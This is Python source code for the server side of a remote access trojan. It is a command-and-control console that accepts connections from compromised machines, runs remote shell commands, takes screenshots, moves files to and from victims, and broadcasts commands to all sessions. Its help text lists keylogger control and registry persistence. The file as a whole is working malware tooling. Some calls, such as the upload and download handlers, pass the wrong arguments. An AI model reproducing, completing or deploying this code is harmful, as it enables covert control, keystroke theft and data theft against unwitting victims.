import os
import json
import socket
import threading
from termcolor import colored


def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_receive(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(300)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1) ##If any error occurs uncomment this line
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(colored(f'[+] {str(ip)} has Connected!','green'))
        except:
            pass


def target_communication(target, ip):
    count = 1
    while True:
        command = input(colored('* Shell~%s: ' % str(ip), 'yellow'))
        reliable_send(target, command)
        
        #QUIT
        if command == 'quit' or command == 'exit':
            targets.remove(target)
            ips.remove(ip)
            # target.close()
            break
        
        #CHANGE SESSION
        elif command == 'change target':
            break

        #CLEAR SCREEN
        elif command == 'clear':
            if os.sys.platform.startswith('win'):
                os.system('cls')
            elif os.sys.platform.startswith('linux'):
                os.system('clear')
        
        #SCREENSHOT
        elif command == '-Ss':
            f = open('screenshot%d.png' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count+=1
        
        #CD
        elif command.startswith('cd'):
            result = reliable_receive(target)
            if result is False:
                print(colored("Directory not found or misspelled", 'red'))
            else:
                print(colored(f'Changed Directory to: {result}', 'green'))

        #UPLOAD
        elif command.startswith('-U'):
            upload_file(command[3:])

        #DOWNLOAD
        elif command.startswith('-D'):
            download_file(command[3:])

        #HELP
        elif command == 'help':
            print(colored('''
            [!!]Commands are CaSe SeNsItIvE [!!]
            ''', 'red')+'\n'+colored('''\n
            quit/exit                           --> Quit Current Session
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory
            -U *file name*                      --> Uploads a File to The Target Machine
            -D *file name*                      --> Downloads a File from Target Machine
            -Kstart                             --> Starts Keylogger
            -Kdump                              --> Prints the Keystrokes Inputted by Target Machine
            -Kstop                              --> Stop and Self Destruct Keylogger File 
            persistence *RegName* *fileName*    --> create Persistence In Registry
            \n''', 'yellow'))
        else:
            result = reliable_receive(target)
            print(colored(result, 'green'))


targets = []; ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
sock.bind(('192.168.0.105', 9797)) # Change the IP ADDRESS HERE
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print(colored('[+] Waiting For Incoming Connections....', 'yellow'))

while True:
    command = input('[**] Command & Control Center: ')
    if command == 'list targets':
        counter = 0
        for ip in ips:
            print(f'Session {counter} --- {str(ip)}')
            counter += 1
    
    elif command == 'clear':
        if os.sys.platform.startswith('win'):
            os.system('cls')
        elif os.sys.platform.startswith('linux'):
            os.system('clear')
    
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            tar_num = targets[num]
            tar_ip = ips[num]
            target_communication(tar_num, tar_ip)
        except:
            print(colored('[-] No Session Found Under That ID number', 'red'))
        
    elif command== 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            # target.close()
        sock.close()
        stop_flag = True
        t1.join()
        break
    
    elif command[:4] == 'kill':
        id = int(command[5:])
        kill_target = targets[id]
        ip = ips[id]
        reliable_send(kill_target, 'quit')
        kill_target.close()
        targets.remove(kill_target)
        ips.remove(ip)
    
    elif command[:7] == 'sendall':
        # x = len(targets)
        i = 0
        try:
            while i < len(targets):
                target_number = targets[i]
                print(target_number)
                reliable_send(target_number, command[8:])
                i+=1
        except:
            print(colored('[-] Failed', 'red'))
    
    elif command[:6] == 'select':
        id = int(command[7:])
        print(id)
        target_communication(targets[id], ips[id])
    elif command == 'help' or command == '-h':
        print(colored('''
        [!!]Commands are CaSe SeNsItIvE [!!]
        ''', 'red')+'\n'+colored('''\n
            session [session_number]/select [session_number]    --> Log in to [session_number] machine)
            sendall [command]                                   --> Sends The Command To All The Machines Connected
            list targets                                        --> List all the connected targets
            change target                                       --> Back to Main Menu to Change Target
            exit                                                --> Quit The Current Session
            clear                                               --> Clear The Screen
            
            
            \n''', 'yellow'))
    else:
        print(colored('[!!] Command Does Not Exist', 'red'))
